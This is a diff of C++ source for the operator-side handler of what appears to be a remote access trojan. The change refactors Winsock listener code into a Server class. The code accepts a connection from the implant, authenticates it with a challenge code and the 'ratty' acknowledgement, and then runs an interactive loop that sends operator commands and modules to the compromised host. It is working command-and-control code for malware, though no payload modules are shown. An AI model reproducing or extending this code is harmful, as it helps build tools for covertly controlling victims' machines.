@@ -1,73 +1,24 @@
 #include <rathandler.hpp>
 
-Handler::Handler(std::string lhost, int lport): LHOST(lhost), LPORT(lport) {
-    rat_conn = INVALID_SOCKET;
+Handler::Handler(std::string lhost, int lport): LHOST(lhost), LPORT(lport), rat_conn_ptr(nullptr) {
     InitializeServer();
     activeModule = nullptr;
 }
 
 void Handler::InitializeServer() {
-    WSADATA wsaData;
-    SOCKET sock_server;
+    Server sock_server(LHOST, LPORT);
+    if (sock_server.ServerUp()) {
+        rat_conn_ptr = sock_server.GetConnectionSocket();
 
-    sockaddr_in address;
-    int addrlen = sizeof(address);
-    const int PORT = LPORT;
+        std::cout << "[*] Incoming Connection. . ." << std::endl;
+        Challenge();
 
-    // Initialize Winsock
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "[-] WSAStartup failed\n";
-        return;
+        // enter user input mode
+        Interact();
+        NotifyClose();
+
+        activeModule = nullptr;
     }
-
-    // Create socket
-    sock_server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock_server == INVALID_SOCKET) {
-        std::cerr << "[-] Socket failed: " << WSAGetLastError() << "\n";
-        WSACleanup();
-        return;
-    }
-
-    // Bind
-    address.sin_family = AF_INET;
-    inet_pton(AF_INET, LHOST.c_str(), &address.sin_addr);
-    address.sin_port = htons(PORT);
-
-    if (bind(sock_server, (sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
-        std::cerr << "[-] Bind failed: " << WSAGetLastError() << "\n";
-        closesocket(sock_server);
-        WSACleanup();
-        return;
-    }
-
-    // Listen
-    if (listen(sock_server, SOMAXCONN) == SOCKET_ERROR) {
-        std::cerr << "[-] Listen failed: " << WSAGetLastError() << "\n";
-        closesocket(sock_server);
-        WSACleanup();
-        return;
-    }
-
-    std::cout << "Waiting for connection...\n";
-    rat_conn = accept(sock_server, (sockaddr*)&address, &addrlen);
-    if (rat_conn == INVALID_SOCKET) {
-        std::cerr << "[-] Accept failed: " << WSAGetLastError() << "\n";
-        closesocket(sock_server);
-        WSACleanup();
-        return;
-    }
-
-    std::cout << "[*] Incoming Connection. . ." << std::endl;
-    Challenge();
-
-    // enter user input mode
-    Interact();
-    NotifyClose();
-
-    activeModule = nullptr;
-    closesocket(rat_conn);
-    closesocket(sock_server);
-    WSACleanup();
 }
 
 std::string Handler::GenerateChallenge() {
@@ -90,14 +41,14 @@ std::string Handler::GenerateChallenge() {
 }
 
 bool Handler::Challenge() {
-    if (rat_conn == INVALID_SOCKET) {
+    if (rat_conn_ptr == nullptr) {
         std::cerr << "[-] Socket Connection not Valid!" << "\n";
         return false;
     }
 
     std::cout << "[*] Initiating Challenge. . ." << std::endl;
 
-    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(rat_conn);
+    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(*rat_conn_ptr);
 
     if (recvPacket.second) {
         std::cout << "[*] Recv Init Packet. . ." << std::endl;
@@ -111,11 +62,11 @@ bool Handler::Challenge() {
             // send challenge
             std::string code = GenerateChallenge();
 
-            RatPacketUtils::Send(rat_conn, RatPacket(code, MsgType::INIT));
+            RatPacketUtils::Send(*rat_conn_ptr, RatPacket(code, MsgType::INIT));
 
             // recv challenge reply
             std::cout << "[*] Viewing Challenge Reply. . ." << std::endl;
-            recvPacket = RatPacketUtils::Recv(rat_conn);
+            recvPacket = RatPacketUtils::Recv(*rat_conn_ptr);
             if (recvPacket.second) {
                 std::string replyCode = recvPacket.first.GetPacketMessage();
                 std::cerr << "[*] Reply Code: " << replyCode << std::endl;
@@ -123,30 +74,30 @@ bool Handler::Challenge() {
                 if (replyCode == code) {
                     // notify rat were established
                     std::cout << "[+] Established RAT Connection!" << std::endl;
-                    RatPacketUtils::Send(rat_conn, RatPacket("ratty", MsgType::INIT));
+                    RatPacketUtils::Send(*rat_conn_ptr, RatPacket("ratty", MsgType::INIT));
                     return true;
                 }
 
                 std::cerr << "[-] Invalid Reply Code! (" << replyCode << ")" << "\n";
-                RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
+                RatPacketUtils::Send(*rat_conn_ptr, RatPacket("", MsgType::DROP));
                 return false;
             }
             std::cerr << "[-] Recv no Data!" << "\n";
-            RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
+            RatPacketUtils::Send(*rat_conn_ptr, RatPacket("", MsgType::DROP));
             return false;
         }
         std::cerr << "[-] Invalid Message! (" << msg << ")" << "\n";
         recvPacket.first.VisualizePacket();
-        RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
+        RatPacketUtils::Send(*rat_conn_ptr, RatPacket("", MsgType::DROP));
         return false;
     }
     std::cerr << "[-] Recv no Data!" << "\n";
-    RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
+    RatPacketUtils::Send(*rat_conn_ptr, RatPacket("", MsgType::DROP));
     return false;
 }
 
 void Handler::Interact() {
-    if (rat_conn == INVALID_SOCKET) {
+    if (rat_conn_ptr == nullptr) {
         std::cerr << "[-] Socket Connection not Valid!" << "\n";
         return;
     }
@@ -160,7 +111,7 @@ void Handler::Interact() {
             ProcessCommand(input);
 
             if (activeModule != nullptr) {
-                activeModule->execute(rat_conn);
+                activeModule->execute(*rat_conn_ptr);
                 activeModule = nullptr;
             }
         }
@@ -188,5 +139,5 @@ void Handler::ProcessCommand(const std::string& input) {
 
 void Handler::NotifyClose() {
     std::cout << "[*] Notifying RAT of closing. . .\n";
-    RatPacketUtils::Send(rat_conn, RatPacket("closed", MsgType::NONE));
+    RatPacketUtils::Send(*rat_conn_ptr, RatPacket("closed", MsgType::NONE));
 }
